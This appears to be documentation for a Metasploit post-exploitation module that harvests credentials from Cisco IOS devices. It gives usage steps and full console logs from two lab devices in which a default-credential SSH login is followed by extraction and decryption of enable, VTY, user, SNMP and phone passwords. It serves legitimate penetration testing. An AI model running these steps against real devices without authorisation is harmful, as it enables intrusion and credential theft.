## Vulnerable Application

  This module has been tested on the following hardware/OS combinations.

  * IOS
    * Catalyst 2950, C2950-I6K2L2Q4-M, Version 12.1(22)EA13
    * UC520, UC520-8U-4FXO-K9, Version 12.4(20)T2

  The Catalyst 2950 config can be found [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/cisco-2950.config)

  This module will look for the follow parameters which contain credentials:

  * IOS
    * enable
    * snmp-server
    * VTY
    * WiFi
    * VPN
    * username
    * PPP

## Verification Steps

  1. Start msfconsole
  2. Get a shell
  3. Do: ```use post/cisco/gather/enum_cisco```
  4. Do: ```set session [id]```
  5. Do: ```set verbose true```
  6. Do: ```run```

## Scenarios

### Catalyst 2950, C2950-I6K2L2Q4-M, Version 12.1(22)EA13

```
resource (cisco.rb)> use auxiliary/scanner/ssh/ssh_login
resource (cisco.rb)> set username cisco
username => cisco
resource (cisco.rb)> set password cisco
password => cisco
resource (cisco.rb)> set rhosts 222.222.2.222
rhosts => 222.222.2.222
resource (cisco.rb)> run
[+] 222.222.2.222:22 - Success: 'cisco:cisco' ''
[*] Command shell session 1 opened (111.111.1.111:40721 -> 222.222.2.222:22) at 2019-07-20 16:29:05 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (cisco.rb)> use post/cisco/gather/enum_cisco
resource (cisco.rb)> set session 1
session => 1
resource (cisco.rb)> set verbose true
verbose => true
resource (cisco.rb)> set enable enable
enable => enable
resource (cisco.rb)> run
[!] SESSION may not be compatible with this module.
[*] Getting version information
[*] Getting privilege level
[*] The device OS is IOS
[*] Session running in mode EXEC
[*] Privilege level 1
[+] version information stored in to loot, file:/root/.msf4/loot/20190720162921_default_222.222.2.222_cisco.ios.versio_081759.txt
[*] Gathering info from show ip interface brief
[+] Saving to /root/.msf4/loot/20190720162941_default_222.222.2.222_cisco.ios.interf_908844.txt
[*] Gathering info from show inventory
[+] Saving to /root/.msf4/loot/20190720162946_default_222.222.2.222_cisco.ios.hw_inv_152516.txt
[+] Obtained higher privilege level.
[*] Gathering info from show run
[*] Parsing running configuration for credentials and secrets...
[+] 222.222.2.222:22 MD5 Encrypted Enable Password: $1$crRb$AJAfWfnDJ6Kf83o.P4RxU0
[+] 222.222.2.222:22 Decrypted Enable Password: password
[+] 222.222.2.222:22 Username 'encrypted' with Decrypted Password: encrypted
[+] 222.222.2.222:22 Username 'admin' with Password: admin
[+] 222.222.2.222:22 Username 'cisco' with Password: cisco
[+] 222.222.2.222:22 Unencrypted VTY Password: password
[+] 222.222.2.222:22 Decrypted VTY Password: password
[+] Saving to /root/.msf4/loot/20190720163001_default_222.222.2.222_cisco.ios.run_co_537064.txt
[*] Gathering info from show cdp neigh
[+] Saving to /root/.msf4/loot/20190720163006_default_222.222.2.222_cisco.ios.cdp_ne_989308.txt
[*] Post module execution completed
[*] Starting persistent handler(s)...
msf5 post(cisco/gather/enum_cisco) > creds
Credentials
===========

host           origin         service  public     private                         realm  private_type        JtR Format
----           ------         -------  ------     -------                         -----  ------------        ----------
222.222.2.222  222.222.2.222  22/tcp   cisco      cisco                                  Password            
222.222.2.222  222.222.2.222  22/tcp              $1$crRb$AJAfWfnDJ6Kf83o.P4RxU0         Nonreplayable hash  md5
222.222.2.222  222.222.2.222  22/tcp              password                               Password            
222.222.2.222  222.222.2.222  22/tcp   encrypted  encrypted                              Password            
222.222.2.222  222.222.2.222  22/tcp   admin      admin                                  Password            
```

### UC520, UC520-8U-4FXO-K9, Version 12.4(20)T2

```
resource (cisco.rb)> use auxiliary/scanner/ssh/ssh_login
resource (cisco.rb)> set username cisco
username => cisco
resource (cisco.rb)> set password cisco
password => cisco
resource (cisco.rb)> set rhosts 222.222.2.222
rhosts => 222.222.2.222
resource (cisco.rb)> run
[+] 222.222.2.222:22 - Success: 'cisco:cisco' ''
[*] Command shell session 1 opened (111.111.1.111:38791 -> 222.222.2.222:22) at 2019-07-21 13:46:53 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (cisco.rb)> use post/cisco/gather/enum_cisco
resource (cisco.rb)> set session 1
session => 1
resource (cisco.rb)> set verbose true
verbose => true
resource (cisco.rb)> set enable cisco
enable => cisco
resource (cisco.rb)> run
[!] SESSION may not be compatible with this module.
[*] Getting version information
[*] Getting privilege level
[*] The device OS is IOS
[*] Session running in mode EXEC
[*] Privilege level 1
[+] version information stored in to loot, file:/root/.msf4/loot/20190721134708_default_222.222.2.222_cisco.ios.versio_150133.txt
[*] Gathering info from show login
[+] Saving to /root/.msf4/loot/20190721134723_default_222.222.2.222_cisco.ios.login__808821.txt
[*] Gathering info from show ip interface brief
[+] Saving to /root/.msf4/loot/20190721134728_default_222.222.2.222_cisco.ios.interf_382575.txt
[*] Gathering info from show inventory
[+] Saving to /root/.msf4/loot/20190721134733_default_222.222.2.222_cisco.ios.hw_inv_285301.txt
[+] Obtained higher privilege level.
[*] Gathering info from show run
[*] Parsing running configuration for credentials and secrets...
[+] 222.222.2.222:22 MD5 Encrypted Enable Password: $1$TF.y$3E7pZ2szVvQw5JG8SDjNa1
[+] 222.222.2.222:22 Username 'cisco' with MD5 Encrypted Password: $1$DaqN$iP32E5WcOOui/H66R63QB0
[+] 222.222.2.222:22 SNMP Community (RO): public
[+] 222.222.2.222:22 SNMP Community (RW): private
[+] 222.222.2.222:22 ePhone Username 'phoneone' with Password: 111111
[+] 222.222.2.222:22 ePhone Username 'phonetwo' with Password: 222222
[+] 222.222.2.222:22 ePhone Username 'phonethree' with Password: 333333
[+] 222.222.2.222:22 ePhone Username 'phonefour' with Password: 444444
[+] Saving to /root/.msf4/loot/20190721134748_default_222.222.2.222_cisco.ios.run_co_344605.txt
[*] Gathering info from show cdp neigh
[+] Saving to /root/.msf4/loot/20190721134753_default_222.222.2.222_cisco.ios.cdp_ne_471320.txt
[*] Gathering info from show lldp neigh
[+] Saving to /root/.msf4/loot/20190721134758_default_222.222.2.222_cisco.ios.cdp_ne_337076.txt
[*] Post module execution completed
[*] Starting persistent handler(s)...
msf5 post(cisco/gather/enum_cisco) > creds
Credentials
===========

host           origin         service  public      private                         realm  private_type        JtR Format
----           ------         -------  ------      -------                         -----  ------------        ----------
222.222.2.222  222.222.2.222  22/tcp   cisco       $1$DaqN$iP32E5WcOOui/H66R63QB0         Nonreplayable hash  md5
222.222.2.222  222.222.2.222  22/tcp   cisco       cisco                                  Password            
222.222.2.222  222.222.2.222  22/tcp   phoneone    111111                                 Password            
222.222.2.222  222.222.2.222  22/tcp   phonetwo    222222                                 Password            
222.222.2.222  222.222.2.222  22/tcp   phonethree  333333                                 Password            
222.222.2.222  222.222.2.222  22/tcp   phonefour   444444                                 Password            
222.222.2.222  222.222.2.222  161/udp              private                                Password            
222.222.2.222  222.222.2.222  161/udp              public                                 Password            
222.222.2.222  222.222.2.222  22/tcp               $1$TF.y$3E7pZ2szVvQw5JG8SDjNa1         Nonreplayable hash  md5
```
